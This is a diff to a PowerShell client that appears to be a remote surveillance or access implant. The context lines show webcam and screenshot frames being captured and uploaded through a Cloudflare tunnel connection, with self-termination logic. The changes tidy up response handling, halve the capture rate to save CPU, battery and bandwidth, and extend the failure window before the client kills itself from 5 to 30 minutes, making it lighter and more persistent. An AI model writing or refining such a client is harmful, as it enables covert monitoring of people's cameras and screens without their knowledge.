@@ -277,10 +277,15 @@ function Send-Http {
         $stream.Close()
     }
     $resp = $req.GetResponse()
-    $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
-    $result = $reader.ReadToEnd()
-    $reader.Close()
-    $resp.Close()
+    try {
+        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
+        $result = $reader.ReadToEnd()
+        $reader.Close()
+    } finally {
+        # Always release the response/connection, even on read errors —
+        # prevents slow connection-pool leaks under KeepAlive.
+        $resp.Close()
+    }
     return $result
 }
 
@@ -490,7 +495,7 @@ if (`$ffmpeg) {
                 finally { try { Remove-Item `$tmpJpeg -Force -ErrorAction SilentlyContinue } catch {} }
                 `$i++
                 if (`$i % 5 -eq 0 -and (ShouldStop)) { break }
-                Start-Sleep -Milliseconds 500
+                Start-Sleep -Milliseconds 1000  # 1 fps — halves CPU/battery/bandwidth
             }
         } else {
             throw 'no video device found'
@@ -511,7 +516,7 @@ if (-not `$usedFfmpeg) {
                 `$i++
             } catch { break }
             if (`$i % 5 -eq 0 -and (ShouldStop)) { break }
-            Start-Sleep -Milliseconds 500
+            Start-Sleep -Milliseconds 1000  # 1 fps — halves CPU/battery/bandwidth
         }
     } catch {
         Report "[!] Screenshot stream failed: `$(`$_.Exception.Message)`n"
@@ -629,7 +634,7 @@ if (-not `$usedFfmpeg) {
                         } catch {}
                         finally { try { Remove-Item $tmpJpeg -Force -ErrorAction SilentlyContinue } catch {} }
                         $i++
-                        Start-Sleep -Milliseconds 500
+                        Start-Sleep -Milliseconds 1000  # 1 fps — halves CPU/battery/bandwidth
                     }
                 } else { throw 'no video device found' }
             } catch {
@@ -646,7 +651,7 @@ if (-not `$usedFfmpeg) {
                         UploadFrame $bytes
                         $i++
                     } catch { break }
-                    Start-Sleep -Milliseconds 500
+                    Start-Sleep -Milliseconds 1000  # 1 fps — halves CPU/battery/bandwidth
                 }
             } catch {
                 Report "[!] Screenshot stream failed: $($_.Exception.Message)`n"
@@ -1159,7 +1164,10 @@ function Connect-Cloudflare {
     $activeDelay   = 300
     $consecutiveIdle = 0
     $failingSince  = $null    # timestamp of first consecutive failure
-    $selfKillMins  = 5        # kill self after this many minutes of non-stop failure
+    $selfKillMins  = 30       # kill self after this many minutes of non-stop failure
+                              # (was 5 — ride out tunnel/network outages instead of
+                              #  restart-churning every 5 min; backoff keeps retrying
+                              #  and the server clears stale state on reconnect)
 
     Write-Log "Client v$Version started. PID=$PID. Connecting to $cfHost"
 
